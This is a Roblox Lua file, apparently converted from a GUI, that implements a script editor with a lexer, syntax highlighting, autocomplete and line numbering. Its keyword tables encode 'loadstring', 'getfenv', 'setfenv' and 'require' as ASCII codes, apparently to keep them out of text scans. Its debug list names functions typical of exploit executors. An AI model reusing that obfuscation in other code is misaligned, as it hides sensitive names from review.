	{ Prefix .. STRING_MULTI_INCOMP .. Suffix, "string" },

	-- Comments
	{ Prefix .. COMMENT_MULTI .. Suffix, "comment" },
	{ Prefix .. COMMENT_MULTI_INCOMP .. Suffix, "comment" },
	{ Prefix .. COMMENT_PLAIN .. Suffix, "comment" },
	{ Prefix .. COMMENT_INCOMP .. Suffix, "comment" },

	-- Operators
	{ Prefix .. OPERATORS .. Suffix, "operator" },
	{ Prefix .. BRACKETS .. Suffix, "operator" },

	-- Unicode
	{ Prefix .. UNICODE .. Suffix, "iden" },

	-- Unknown
	{ "^.", "iden" },
}

--- Create a plain token iterator from a string.
-- @tparam string s a string.

function lexer.scan(s)
	-- local startTime = os.clock()
	lexer.finished = false

	local index = 1
	local sz = #s
	local p1, p2, p3, pT = "", "", "", ""

	return function()
		if index <= sz then
			for _, m in ipairs(lua_matches) do
				local i1, i2 = string.find(s, m[1], index)
				if i1 then
					local tok = string.sub(s, i1, i2)
					index = i2 + 1
					lexer.finished = index > sz
					--if lexer.finished then
					--	print((os.clock()-startTime)*1000, "ms")
					--end

					local t = m[2]
					local t2 = t

					-- Process t into t2
					if string.find(tok, "^https://") then
						t2 = "link"
					end
					
					if t == "var" and t2 ~= "link" then
						-- Since we merge spaces into the tok, we need to remove them
						-- in order to check the actual word it contains
						local cleanTok = string.gsub(tok, Cleaner, "")

						if lua_keyword[cleanTok] then
							t2 = "keyword"
						elseif lua_builtin[cleanTok] then
							t2 = "builtin"
						elseif lua_properties[cleanTok] then
							t2 = "properties"
						elseif lua_booleans[cleanTok] then
							t2 = "boolean"
						elseif lua_variables[cleanTok] then
							t2 = "variable"
						elseif lua_customKeywords[cleanTok] then
							t2 = "custom"
						else
							t2 = "iden"
						end
						
						--[[
						if string.find(p1, ":%s*[%s%c]*$") and pT ~= "comment" then
							-- The previous was a : so we need to special case method indexing
							local parent = string.gsub(p2, Cleaner, "")
							local lib = lua_libraries[parent]
							if lib and lib[cleanTok] and not string.find(p3, "%.[%s%c]*$") then
								-- Indexing a builtin lib with existing item, treat as a builtin
								t2 = "localmethod"
							else
								-- Indexing a non-builtin, can't be treated as a keyword/builtin
								t2 = "localmethod"
							end
						end
						]]
						
						-- make it so if it has "https://" then it'll count as a link

						if string.find(p1, "%.[%s%c]*$") and pT ~= "comment" then
							-- The previous was a . so we need to special case indexing things
							local parent = string.gsub(p2, Cleaner, "")
							local lib = lua_libraries[parent]
							if lib and lib[cleanTok] and not string.find(p3, "%.[%s%c]*$") then
								-- Indexing a builtin lib with existing item, treat as a builtin
								t2 = "builtin"
							else
								-- Indexing a non builtin, can't be treated as a keyword/builtin
								t2 = "localproperty"
							end
							-- print("indexing",parent,"with",cleanTok,"as",t2)
						end
						if t2 ~= "builtin" and t2 ~= "keyword" then
							if string.find(s, "^%s*%(", index) or string.find(s, "^%s*'", index) or string.find(s, '^%s*"', index) or string.find(s, '^%s*{', index) then
								-- The next character after this token is an open parenthesis
								t2 = "localmethod"
							end
						end
					end

					-- Record last 3 tokens for the indexing context check
					p3 = p2
					p2 = p1
					p1 = tok
					pT = t2
					return t2, tok
				end
			end
		end
	end
end

function lexer.navigator()
	local nav = {
		Source = "",
		TokenCache = table.create(50),

		_RealIndex = 0,
		_UserIndex = 0,
		_ScanThread = nil,
	}

	function nav:Destroy()
		self.Source = nil
		self._RealIndex = nil
		self._UserIndex = nil
		self.TokenCache = nil
		self._ScanThread = nil
	end

	function nav:SetSource(SourceString)
		self.Source = SourceString

		self._RealIndex = 0
		self._UserIndex = 0
		table.clear(self.TokenCache)

		self._ScanThread = coroutine.create(function()
			for Token, Src in lexer.scan(self.Source) do
				self._RealIndex += 1
				self.TokenCache[self._RealIndex] = { Token, Src }
				coroutine.yield(Token, Src)
			end
		end)
	end

	function nav.Next()
		nav._UserIndex += 1

		if nav._RealIndex >= nav._UserIndex then
			-- Already scanned, return cached
			return table.unpack(nav.TokenCache[nav._UserIndex])
		else
			if coroutine.status(nav._ScanThread) == "dead" then
				-- Scan thread dead
				return
			else
				local success, token, src = coroutine.resume(nav._ScanThread)
				if success and token then
					-- Scanned new data
					return token, src
				else
					-- Lex completed
					return
				end
			end
		end
	end

	function nav.Peek(PeekAmount)
		local GoalIndex = nav._UserIndex + PeekAmount

		if nav._RealIndex >= GoalIndex then
			-- Already scanned, return cached
			if GoalIndex > 0 then
				return table.unpack(nav.TokenCache[GoalIndex])
			else
				-- Invalid peek
				return
			end
		else
			if coroutine.status(nav._ScanThread) == "dead" then
				-- Scan thread dead
				return
			else
				local IterationsAway = GoalIndex - nav._RealIndex

				local success, token, src = nil, nil, nil

				for _ = 1, IterationsAway do
					success, token, src = coroutine.resume(nav._ScanThread)
					if not (success or token) then
						-- Lex completed
						break
					end
				end

				return token, src
			end
		end
	end

	return nav
end

return lexer

end;
};
G2L_MODULES[G2L["29"]] = {
Closure = function()
    local script = G2L["29"];function asciiDecode(str : string)
	local decoded = ""

	str = string.gsub(str, "%s+", "") str = string.gsub(str, "\n+", "")
	str = string.gsub(str, "\t+", "") str = string.gsub(str, "\r+", "")

	for code in str:gmatch("\\(%d+)") do
		decoded = decoded .. string.char(tonumber(code))
	end

	return decoded
end

return {
	customKeywords = {},
	
	keyword = {
		["and"] = true,
		["break"] = true,
		["do"] = true,
		["else"] = true,
		["elseif"] = true,
		["end"] = true,
		["for"] = true,
		["function"] = true,
		["if"] = true,
		["in"] = true,
		["not"] = true,
		["while"] = true,
		["or"] = true,
		["repeat"] = true,
		["return"] = true,
		["then"] = true,
		["self"] = true,
		["until"] = true,
		["continue"] = true,
		["export"] = true,
		["type"] = true,
		["typeof"] = true,
	},
	
	variables = {
		["local"] = true,
	},

	builtin = {
		-- Lua Functions
		["assert"] = true,
		["collectgarbage"] = true,
		["error"] = true,
		[asciiDecode([[
			\103
			\101
			\116
			\102
			\101
			\110
			\118
		]])] = true,
		["getmetatable"] = true,
		["ipairs"] = true,
		[asciiDecode([[
			\108
			\111
			\97
			\100
			\115
			\116
			\114
			\105
			\110
			\103
		]])] = true,
		["newproxy"] = true,
		["next"] = true,
		["pairs"] = true,
		["pcall"] = true,
		["print"] = true,
		["rawequal"] = true,
		["rawget"] = true,
		["rawset"] = true,
		["select"] = true,
		[asciiDecode([[
			\115
			\101
			\116
			\102
			\101
			\110
			\118
		]])] = true,
		["setmetatable"] = true,
		["tonumber"] = true,
		["tostring"] = true,
		["unpack"] = true,
		["xpcall"] = true,
		["buffer"] = true,
		["Font"] = true,
		
		-- API functions

		-- Lua Variables
		["_G"] = true,
		["_VERSION"] = true,

		-- Lua Tables
		["bit32"] = true,
		["coroutine"] = true,
		["debug"] = true,
		["math"] = true,
		["os"] = true,
		["string"] = true,
		["table"] = true,
		["utf8"] = true,

		-- Roblox Functions
		["delay"] = true,
		["elapsedTime"] = true,
		["gcinfo"] = true,
		[asciiDecode([[
			\114
			\101
			\113
			\117
			\105
			\114
			\101
		]])] = true,
		["settings"] = true,
		["spawn"] = true,
		["tick"] = true,
		["time"] = true,
		["UserSettings"] = true,
		["wait"] = true,
		["warn"] = true,
		["ypcall"] = true,

		-- Roblox Variables
		["Enum"] = true,
		["shared"] = true,
		["script"] = true,
		["workspace"] = true,
		["Workspace"] = true,
		["plugin"] = true,
		["game"] = true,
		["Game"] = true,

		-- Roblox Tables
		["Axes"] = true,
		["BrickColor"] = true,
		["CatalogSearchParams"] = true,
		["CellId"] = true,
		["CFrame"] = true,
		["Color3"] = true,
		["ColorSequence"] = true,
		["ColorSequenceKeypoint"] = true,
		["DateTime"] = true,
		["DockWidgetPluginGuiInfo"] = true,
		["Faces"] = true,
		["File"] = true,
		["FloatCurveKey"] = true,
		["Instance"] = true,
		["NumberRange"] = true,
		["NumberSequence"] = true,
		["NumberSequenceKeypoint"] = true,
		["OverlapParams"] = true,
		["PathWaypoint"] = true,
		["PhysicalProperties"] = true,
		["PluginDrag"] = true,
		["Random"] = true,
		["Ray"] = true,
		["RaycastParams"] = true,
		["Rect"] = true,
		["Region3"] = true,
		["Region3int16"] = true,
		["RotationCurveKey"] = true,
		["task"] = true,
		["TextChatMessageProperties"] = true,
		["TweenInfo"] = true,
		["UDim"] = true,
		["UDim2"] = true,
		["Vector2"] = true,
		["Vector2int16"] = true,
		["Vector3"] = true,
		["Vector3int16"] = true,
	},
	
	properties = {
		-- Appearance
		["BrickColor"] = true,
		["CastShadows"] = true,
		["Color"] = true,
		["Material"] = true,
		["Reflectance"] = true,
		["MaterialVariant"] = true,
		["Transparency"] = true,
		["MeshId"] = true,
		["RenderFidelity"] = true,
		["TextureID"] = true,
		
		-- Data
		["Parent"] = true,
		["Name"] = true,
		["Archivable"] = true,
		["ClassName"] = true,
		["Locked"] = true,
		["ResizeableFaces"] = true,
		["ResizeIncrement"] = true,
		
		-- Transform
		["Size"] = true,
		["CFrame"] = true,
		["Orgin"] = true,
		["Position"] = true,
		["Orientation"] = true,
		["PivotOffset"] = true,
		
		-- Collision
		["CanCollide"] = true,
		["CanTouch"] = true,
		["CollisionGroup"] = true,
		
		-- Object
		["Anchored"] = true,
		["CenterOfMass"] = true,
		["CurrentPhysicalProperties"] = true,
		["CustomPhysicalProperties"] = true,
		["Mass"] = true,
		["Massless"] = true,
		["RootPriority"] = true,
		["Shape"] = true,
		["PrimaryPart"] = true,
		["Scale"] = true,
		
		-- Behavior
		["ModelStreamingMode"] = true,
		
		-- Assembly
		["AssemblyLinearVelocity"] = true,
		["AssemblyAngularVelocity"] = true,
		["AssemblyCenterOfMass"] = true,
		["AssemblyMass"] = true,
		["AssemblyRootPart"] = true,
		
		-- Script
		["Enabled"] = true,
		["Disabled"] = true,
		["Source"] = true,
		["CurrentEditor"] = true,
		["RunContext"] = true,
	},
	
	booleans = {
		["true"] = true,
		["false"] = true,
		["nil"] = true,
	},
	
	comments = {
		["TODO"] = true,
	},

	libraries = {

		-- Lua Libraries
		math = {
			abs = true,
			acos = true,
			asin = true,
			atan = true,
			atan2 = true,
			ceil = true,
			clamp = true,
			cos = true,
			cosh = true,
			deg = true,
			exp = true,
			floor = true,
			fmod = true,
			frexp = true,
			ldexp = true,
			log = true,
			log10 = true,
			max = true,
			min = true,
			modf = true,
			noise = true,
			pow = true,
			rad = true,
			random = true,
			round = true,
			sinh = true,
			sqrt = true,
			tan = true,
			tanh = true,
			sign = true,
			sin = true,
			randomseed = true,

			huge = true,
			pi = true,
		},

		string = {
			byte = true,
			char = true,
			find = true,
			format = true,
			gmatch = true,
			gsub = true,
			len = true,
			lower = true,
			match = true,
			pack = true,
			packsize = true,
			rep = true,
			reverse = true,
			split = true,
			sub = true,
			unpack = true,
			upper = true,
		},

		table = {
			clear = true,
			concat = true,
			foreach = true,
			foreachi = true,
			freeze = true,
			getn = true,
			insert = true,
			isfrozen = true,
			maxn = true,
			remove = true,
			sort = true,
			find = true,
			pack = true,
			unpack = true,
			move = true,
			create = true,
		},

		debug = {
			dumpheap = true,
			info = true,
			profilebegin = true,
			profileend = true,
			resetmemorycategory = true,
			setmemorycategory = true,
			traceback = true,
			getconstant = true,
			getconstants = true,
			getinfo = true,
			getproto = true,
			getprotos = true,
			getstack = true,
			getupvalue = true,
			getupvalues = true,
			setconstant = true,
			setstack = true,
			setupvalue = true,
			getregistry = true,
			setmetatable = true,
			getlocals = true,
			getlocal = true,
			setlocal = true,
		},

		os = {
			time = true,
			date = true,
			difftime = true,
			clock = true,
		},

		coroutine = {
			create = true,
			isyieldable = true,
			resume = true,
			running = true,
			status = true,
			wrap = true,
			yield = true,
		},

		bit32 = {
			arshift = true,
			band = true,
			bnot = true,
			bor = true,
			btest = true,
			bxor = true,
			countlz = true,
			countrz = true,
			extract = true,
			lrotate = true,
			lshift = true,
			replace = true,
			rrotate = true,
			rshift = true,
		},

		utf8 = {
			char = true,
			codepoint = true,
			codes = true,
			graphemes = true,
			len = true,
			nfcnormalize = true,
			nfdnormalize = true,
			offset = true,

			charpattern = true,
		},

		-- Roblox Libraries
		Axes = {
			new = true,
		},

		BrickColor = {
			new = true,
			New = true,
			Random = true,
			Black = true,
			Blue = true,
			DarkGray = true,
			Gray = true,
			Green = true,
			Red = true,
			White = true,
			Yellow = true,
			palette = true,
			random = true,
		},

		CatalogSearchParams = {
			new = true,
		},

		CellId = {
			new = true,
		},

		CFrame = {
			new = true,
			Angles = true,
			fromAxisAngle = true,
			fromEulerAnglesXYZ = true,
			fromEulerAnglesYXZ = true,
			fromMatrix = true,
			fromOrientation = true,
			lookAt = true,

			identity = true,
		},

		Color3 = {
			new = true,
			fromRGB = true,
			fromHSV = true,
			fromHex = true,
			toHSV = true,
		},

		ColorSequence = {
			new = true,
		},

		ColorSequenceKeypoint = {
			new = true,
		},

		DateTime = {
			now = true,
			fromIsoDate = true,
			fromLocalTime = true,
			fromUniversalTime = true,
			fromUnixTimestamp = true,
			fromUnixTimestampMillis = true,
		},

		DockWidgetPluginGuiInfo = {
			new = true,
		},

		Faces = {
			new = true,
		},

		FloatCurveKey = {
			new = true,
		},

		Instance = {
			new = true,
		},

		NumberRange = {
			new = true,
		},

		NumberSequence = {
			new = true,
		},

		NumberSequenceKeypoint = {
			new = true,
		},

		OverlapParams = {
			new = true,
		},

		PathWaypoint = {
			new = true,
		},

		PhysicalProperties = {
			new = true,
		},

		PluginDrag = {
			new = true,
		},

		Random = {
			new = true,
		},

		Ray = {
			new = true,
		},

		RaycastParams = {
			new = true,
		},

		Rect = {
			new = true,
		},

		Region3 = {
			new = true,
		},

		Region3int16 = {
			new = true,
		},

		RotationCurveKey = {
			new = true,
		},

		task = {
			wait = true,
			spawn = true,
			delay = true,
			defer = true,
			synchronize = true,
			desynchronize = true,
		},

		TweenInfo = {
			new = true,
		},

		UDim = {
			new = true,
		},

		UDim2 = {
			new = true,
			fromScale = true,
			fromOffset = true,
		},

		Vector2 = {
			new = true,

			one = true,
			zero = true,
			xAxis = true,
			yAxis = true,
		},

		Vector2int16 = {
			new = true,
		},

		Vector3 = {
			new = true,
			fromAxis = true,
			fromNormalId = true,
			FromAxis = true,
			FromNormalId = true,

			one = true,
			zero = true,
			xAxis = true,
			yAxis = true,
			zAxis = true,
		},

		Vector3int16 = {
			new = true,
		},
		
		buffer = {
			tostring = true,
			len = true,
			readi8 = true,
			readf32 = true,
			readu8 = true,
			readf64 = true,
			readi16 = true,
			readi32 = true,
			readu16 = true,
			readu32 = true,
			copy = true,
			fill = true,
			create = true,
			writei8 = true,
			writeu8 = true,
			writef32 = true,
			writef64 = true,
			writei16 = true,
			writei32 = true,
			writeu16 = true,
			writeu32 = true,
			fromstring = true,
			readstring = true,
			writestring = true,
		},
		
		Font = {
			new = true,
			fromId = true,
			fromEnum = true,
			fromName = true,
		},
		
		Enum = {
			KeyCode = true,
			Button = true,
			Material = true,
			AutomaticSize = true,
			UserInputType = true,
			Font = true,
			NormalId = true,
			EasingStyle = true,
			EasingDirection = true,
			PoseEasingStyle = true,
			CameraType = true,
			SortOrder = true,
			CoreGuiType = true,
			InOut = true,
			RigType = true,
			ExplosionType = true,
			FontSize = true,
			VerticalAlignment = true,
			HorizontalAlignment = true,
			CameraMode = true,
			TextXAlignment = true,
			HumanoidRigType = true,
			BodyPart = true,
			InputType = true,
			ScaleType = true,
			AspectType = true,
			ChatVersion = true,
			DominantAxis = true,
			FillDirection = true,
			TextYAlignment = true,
			ApplyStrokeMode = true,
			HumanoidStateType = true,
			Language = true,
			MeshType = true,
			UserInputState = true,
			ZIndexBehavior = true,
			RaycastFilterType = true,
			ModelStreamingMode = true,
			Axis = true,
			Limb = true,
			AdShape = true,
			AlignType = true,
			AlphaMode = true,
			AssetType = true,
			ActionType = true,
			AdEventType = true,
			ActuatorType = true,
			AdUnitStatus = true,
			AudioSubType = true,
		},
	},
}
end;
};
G2L_MODULES[G2L["2a"]] = {
Closure = function()
    local script = G2L["2a"];local Input = {}

function Input:set(data)
	self._textbox = nil
	self._lineHighlighter = nil
	self._inputCursor = nil
	
	self._focused = false
	self._transparent = false
	self._isAnimating = false
	
	self._shared = nil
	
	self._services = {}
	
	self._data = data
	
	self:init()
end

function Input:init()
	self._textbox = self._data.textbox
	self._lineHighlighter = script.LineHighlighter:Clone()
	self._inputCursor = script.InputCursor:Clone()
	
	self._lineHighlighter.Parent = self._textbox
	self._inputCursor.Parent = self._textbox
	
	self._shared = require(script.Parent.Shared)
	
	self._focused = false
	self._transparent = false
	self._isAnimating = false
	
	self._services = {
		TextService = game:GetService("TextService"),
		RunService = game:GetService("RunService"),
	}
	
	task.spawn(function()
		self._services.RunService.RenderStepped:Connect(function()
			if self._transparent then
				self._inputCursor.BackgroundTransparency = 0
			end
			if not self._focused then
				self._inputCursor.BackgroundTransparency = 1
			end
		end)
		
		while task.wait() do
			if self._focused then
				if self._isAnimating then
					self._isAnimating = false
					self._shared:tween(self._inputCursor, TweenInfo.new(.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {BackgroundTransparency = 1})
					task.wait(.5)
				end
				if not self._isAnimating then
					self._isAnimating = true
					self._shared:tween(self._inputCursor, TweenInfo.new(.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {BackgroundTransparency = 0})
					task.wait(.5)
				end
			end
		end
	end)
end

function Input:update(data)
	local cursorPos = self._textbox.CursorPosition - 1
	local cursorLines = (cursorPos > #self._textbox.Text and self._textbox.Text .. (" "):rep(cursorPos - #self._textbox.Text) or self._textbox.Text):sub(0, cursorPos):split("\n")
	
	local cursorLineText = cursorLines[#cursorLines]
	local cursorWidth = self._services.TextService:GetTextSize(cursorLineText, self._textbox.TextSize, self._textbox.Font, Vector2.new(math.huge, math.huge)).X
	
	local textSize = self._services.TextService:GetTextSize("", self._textbox.TextSize, self._textbox.Font, Vector2.new());
	
	self._focused = data.focused
	self._transparent = data.isInputed
	
	self._lineHighlighter.Size = UDim2.new(1, 0, 0, textSize.Y + 3)
	self._inputCursor.Size = UDim2.new(0, 1, 0, textSize.Y + 3)
	
	for index = 1, #cursorLines do
		if data.focused then
			self._lineHighlighter:TweenPosition(UDim2.new(0,-2,0, textSize.Y * (#cursorLines - 1)), 'Out', 'Quad', data.speed, true,nil)
			self._inputCursor:TweenPosition(UDim2.new(0,cursorWidth,0, textSize.Y * (#cursorLines - 1)), 'Out', 'Quad', data.speed, true,nil)
		end
	end
end

function Input:setVisible(boolean)
	self._inputCursor.Visible = boolean
	self._lineHighlighter.Visible = boolean
end

function Input:changeTheme(theme)
	self._inputCursor.BackgroundColor3 = theme.TEXT_COLOR
	self._lineHighlighter.Outline.Color = theme.OUTLINE
	self._lineHighlighter.BackgroundColor3 = theme.DARK_BACKGROUND
	self._lineHighlighter.Outline.Transparency = theme.LINE_HIGHLIGHER_OUTLINE_TRANSPARENCY
end

return Input

end;
};
G2L_MODULES[G2L["2f"]] = {
Closure = function()
    local script = G2L["2f"];local Lines = {}

function Lines:set(data)
	self._label = nil
	self._editor = nil
	self._textbox = nil
	
	self._lineCount = 0
	self._charCount = 0
	self._lines = 0
	
	self._services = {}
	self._data = data
	
	self:init()
end

function Lines:init()
	self._label = self._data.label
	self._editor = self._data.editor
	self._textbox = self._data.textbox
	
	self._label.Text = 1
	
	self._lineCount = 0
	self._lines = 1
	
	self._services = {
		TextService = game:GetService("TextService"),
	}
end

function Lines:update()
	local textSize = self._services.TextService:GetTextSize("", self._textbox.TextSize, self._textbox.Font, Vector2.new());
	local cursorPos = self._textbox.CursorPosition
	local currentLine = 1
	
	self._lineCount = 0
	self._lines = 1
	
	local _, charCount = self._textbox.Text:gsub("", "")
	charCount -= 1
	
	if charCount > 0 then
		_, self._lineCount = self._textbox.Text:gsub("\n", "")
		self._lineCount += 1
	end
	
	self._editor.CanvasSize = UDim2.new(self._editor.CanvasSize.X.Scale, self._editor.CanvasSize.X.Offset, 0, self._lineCount*(textSize.Y*self._textbox.LineHeight)+9)
	self._label.Size = UDim2.new(self._label.Size.X.Scale, self._label.Size.X.Offset, 1, self._lineCount*(textSize.Y*self._textbox.LineHeight)+9)
	
	if cursorPos > 1 then
		local subText = self._textbox.Text:sub(1, cursorPos - 1)
		currentLine = #subText:split("\n")
	end
	
	self._textbox.Text:gsub("\n", function()
		self._lines = self._lines + 1
	end)
	
	self._label.Text = ""
	
	for index = 1, self._lines do
		if index == currentLine then
			local format = "<b>%s</b>"
			format = string.format("<font color='#%s'>", self._data.textBold:ToHex())..format.."</font>"
			
			self._label.Text = self._label.Text .. string.format(format, index) .. "\n"
		else
			self._label.Text = self._label.Text .. index .. "\n"
		end
	end
end

function Lines:changeTextbold(textBold)
	self._data.textBold = textBold
	self:update()
end

return Lines

end;
};
G2L_MODULES[G2L["30"]] = {
Closure = function()
    local script = G2L["30"];local Indenter = {}

function Indenter:set(data)
	self._textbox = nil
	
	self._tabs = 0
	
	self._services = {}
	self._data = data
	
	self:init()
end

function Indenter:init()
	self._textbox = self._data.textbox
	
	self._indent_level = 0
	
	self._services = {
		TextService = game:GetService("TextService"),
	}
	
	self._shared = require(script.Parent.Shared)
end

function Indenter:convertTabs(text)
	return text:gsub("\t", "    ")
end

function Indenter:updateMousePos()
	self._textbox.CursorPosition += 3
end

function Indenter:indentBrackets()
	local indentableBrackets = {
		["{"] = "}",
		["("] = ")",
		["["] = "]",
	}
	
	local textboxText = self._shared:removeControlBytes(self._textbox.Text)
	
	local function makeIndent()
		self._textbox.Text = string.sub(textboxText, 1, self._textbox.CursorPosition - 1).."    " .. "\n"..""..string.sub(textboxText, self._textbox.CursorPosition)
	end
	
	for index, value in pairs(indentableBrackets) do
		if self._shared:getWord(index, 2, self._textbox) then
			makeIndent()
			self._textbox.CursorPosition += 4
		end
	end
end

function Indenter:autoIndent(currentLine, allLines)
	local previousLine = allLines[currentLine - 1] or ""
	local currentIndentation = string.match(previousLine, "^%s*") or ""
	
	--[[
	if previousLine:match("[{[(]$") or previousLine:match("function%s") or previousLine:match("then$") or previousLine:match("do$") then
		currentIndentation = currentIndentation .. "    "
	end

	if previousLine:match("end$") or previousLine:match("^%s*else$") or previousLine:match("^%s*elseif%s") or previousLine:match("^%s*until%s") then
		currentIndentation = currentIndentation:gsub("    $", "")
	end
	]]

	return currentIndentation
end

return Indenter
end;
};
G2L_MODULES[G2L["31"]] = {
Closure = function()
    local script = G2L["31"];local Autocomplete = {}

function Autocomplete:set(data)
	self._textbox = nil
	
	self._data = data
	
	self:init()
end

function Autocomplete:init()
	self._textbox = self._data.textbox
	self._shared = require(script.Parent.Shared)
	
	local frame = script.AutocompleteFrame:Clone()
	frame.Parent = self._textbox
	frame.Visible = false
	self._autocompleteFrame = frame
	
	self._languageKeywords = require(script.Language)
	self._keywords = {}
	self._paletes = {}
	self._theme = {
		THEME_COLOR = Color3.fromRGB(255, 0, 0),

		TEXT_COLOR = Color3.fromRGB(235, 235, 235),
		SHADED_TEXT = Color3.fromRGB(150, 150, 150),

		OUTLINE = Color3.fromRGB(50, 50, 50),
	}
	
	self._selectorLevel = 1
	self._maxLevel = 5
	self._currentIndex = 0
	self._lastCursorPos = 0
	
	self._currentChars = ""
	self._currentWord = ""
	
	for index, section in pairs(self._languageKeywords) do
		for i, keyword in pairs(self._languageKeywords[index]) do
			table.insert(self._keywords, tostring(i))
		end
	end
end

function Autocomplete:completeBracket(data)
	local text = self._shared:removeControlBytes(self._textbox.Text)
	local addedChars = string.sub(text, self._textbox.CursorPosition - 1, self._textbox.CursorPosition - 1)
	local addedWord, cursorPosUntilAddedWord do
		local textTable =  string.split(string.gsub(text, "    ", "\n"), " ")
		addedWord = table.remove(textTable, #textTable)
		addedWord = string.gsub(addedWord, "\t", "")
		addedWord = string.gsub(addedWord, "\n", "")
		textTable = table.concat(textTable, " ")
		cursorPosUntilAddedWord = if #textTable == 0 then 0 else #textTable + #(" ")
	end
	if data.debounce and data.autocompleteCharacters[addedChars] then
		if not data.deleting and not (data.focused == false) then
			data.debounce = false
			self._textbox.Text = string.sub(text, 1, self._textbox.CursorPosition - 1)..data.autocompleteCharacters[addedChars]..string.sub(text, self._textbox.CursorPosition)
		end
	else
		data.debounce = true
	end
end

function Autocomplete:setFrameVisible(boolean)
	self._lastCursorPos = self._textbox.CursorPosition
	self._autocompleteFrame.Visible = boolean
	self._textbox.MultiLine = not boolean
end

function Autocomplete:setPosition(data)
	self._shared:tween(self._autocompleteFrame, TweenInfo.new(data.speed), {Position = data.position})
end

function Autocomplete:getWordAtCursor(cursorPos)
	local text = self._shared:escapeSpecialChars(self._textbox.Text)
	local currentLine = 1
	local currentPos = 0

	for line in text:gmatch("[^\n]*") do
		local lineLength = #line + 1

		if cursorPos <= currentPos + lineLength then
			return self:getWordInLine(line, cursorPos - currentPos)
		end

		currentPos = currentPos + lineLength
		currentLine = currentLine + 1
	end

	return ""
end

function Autocomplete:getWordInLine(line)
	function Autocomplete:getWordInLine(line)
		local position = self._textbox.CursorPosition
		local lines = self._textbox.Text:split("\n")

		local charCount = 0
		local currentLine = nil

		for i, current in ipairs(lines) do
			charCount = charCount + #current + 1
			if position <= charCount then
				currentLine = current
				position = position - (charCount - #current)
				break
			end
		end

		if not currentLine then
			return false
		end

		local wordStart, wordEnd = nil, nil

		for i = position, 1, -1 do
			local char = currentLine:sub(i, i)
			if char == " " then
				wordStart = i + 1
				break
			end
		end

		if not wordStart then
			wordStart = 1
		end

		for i = position, #currentLine do
			local char = currentLine:sub(i, i)
			if char == " " then
				wordEnd = i - 1
				break
			end
		end

		if not wordEnd then
			wordEnd = #currentLine
		end

		local word = currentLine:sub(wordStart, wordEnd)

		if word == "" or word:match("^%s+$") then
			return false
		end

		local suggestions = self:getSuggestions(word, true)
		if not suggestions then
			return false
		end

		return word
	end
end

function Autocomplete:getSuggestions(word, isGettingWord)
	local suggestions = {}

	-- Check if the word matches any in the keywords array
	for index, value in ipairs(self._autocompleteFrame:GetChildren()) do
		if value:IsA("TextButton") then
			value:Destroy()
		end
	end
	
	local paleteIndex = 0
	self._currentIndex = 0
	
	self._paletes = {}
	
	for _, keyword in ipairs(self._keywords) do
		if keyword:sub(1, #word) == word then
			table.insert(suggestions, keyword)
			
			paleteIndex += 1
			self._currentIndex += 1
			
			local actualIndex = paleteIndex

			local palete = script.Palete:Clone()
			palete.Parent = self._autocompleteFrame
			palete.Name = keyword
			palete.Text = `<b><font color='#{self._theme.THEME_COLOR:ToHex()}'>`..word.."</font></b>".. string.rep("", #word) .. keyword:sub(#word + 1)
			palete.Activated:Connect(function()
				self._selectorLevel = actualIndex
				self:getLevel()
				self:completeWord()
			end)
			
			local paleteTable = {
				Palete = palete,
				Index = paleteIndex,
				Word = keyword
			}

			if paleteIndex > self._maxLevel then
				palete:Destroy()
			else
				table.insert(self._paletes, paleteTable)
				if self._selectorLevel > paleteIndex then
					self._selectorLevel = paleteIndex
				end
				self._currentWord = word
				
				spawn(function()
					self:getLevel()
				end)
			end
		end
	end

	return #suggestions > 0 and suggestions or false -- Return suggestions or false if none found
end

function Autocomplete:selectDown()
	if #self._paletes == 0 then
		return
	end
	if self._selectorLevel < self._maxLevel then
		if self._selectorLevel >= self._currentIndex then
			self._selectorLevel = 1
		else
			self._selectorLevel += 1
		end
	end
	
	self:getLevel()
end

function Autocomplete:selectUp()
	if #self._paletes == 0 then
		return
	end
	if self._selectorLevel > 0 then
		self._selectorLevel -= 1
		if self._selectorLevel <= 0 then
			self._selectorLevel = 1
		end
	end

	self:getLevel()
end

function Autocomplete:getLevel()
	for index, value in ipairs(self._paletes) do
		if value.Index == self._selectorLevel then
			value.Palete.BackgroundTransparency = .9
			self._currentChars = value.Word
		else
			value.Palete.BackgroundTransparency = 1
		end
	end
end

function Autocomplete:completeWord()
	if #self._paletes == 0 then
		return
	end
	local text = self._shared:removeControlBytes(self._textbox.Text)
	local addedChars = string.sub(text, self._textbox.CursorPosition - 1, self._textbox.CursorPosition - 1)
	local addedWord, cursorPosUntilAddedWord do
		local textTable =  string.split(string.gsub(text, "    ", "\n"), " ")
		addedWord = table.remove(textTable, #textTable)
		addedWord = string.gsub(addedWord, "\t", "")
		addedWord = string.gsub(addedWord, "\n", "")
		textTable = table.concat(textTable, " ")
		cursorPosUntilAddedWord = if #textTable == 0 then 0 else #textTable + #(" ")
	end
	
	local function autocompleteReplace(text, targetword, replacement, cpuaw, removefirsttab)
		local afterCPUAW = string.gsub(string.sub(text, cpuaw, #text), targetword, replacement, 1)
		if removefirsttab then
			afterCPUAW = string.gsub(afterCPUAW, "    ", "", 1)
		end
		return string.sub(text, 1, cpuaw)..afterCPUAW, cpuaw + #replacement + 1
	end
	
	local replacement, newPos = autocompleteReplace(text, addedWord, self._currentChars, cursorPosUntilAddedWord, false)
	self._textbox.Text = replacement
	
	task.spawn(function()
		for i = 1, 3 do
			self:setFrameVisible(false)
			task.wait()
		end
	end)
	spawn(function()
		self._textbox:CaptureFocus()
		--self._textbox.CursorPosition = newPos
	end)
end

function Autocomplete:isVisible()
	return self._autocompleteFrame.Visible
end

function Autocomplete:getCurrentChars()
	return self._currentChars
end

function Autocomplete:getCurrentWord()
	return self._currentWord
end

function Autocomplete:changeTheme(theme)
	self._autocompleteFrame.UIStroke.Color = theme.OUTLINE
	script.Palete.Icon.ImageColor3 = theme.THEME_COLOR
	script.Palete.BackgroundColor3 = theme.SELECT_BACKGROUND
	
	self._theme = theme
end

return Autocomplete

end;
};
G2L_MODULES[G2L["36"]] = {
Closure = function()
    local script = G2L["36"];return {	
	keyword = {
		["and"] = true,
		["break"] = true,
		["do"] = true,
		["else"] = true,
		["elseif"] = true,
		["end"] = true,
		["for"] = true,
		["function"] = true,
		["if"] = true,
		["in"] = true,
		["local"] = true,
		["not"] = true,
		["while"] = true,
		["or"] = true,
		["repeat"] = true,
		["return"] = true,
		["then"] = true,
		["self"] = true,
		["until"] = true,
		["continue"] = true,
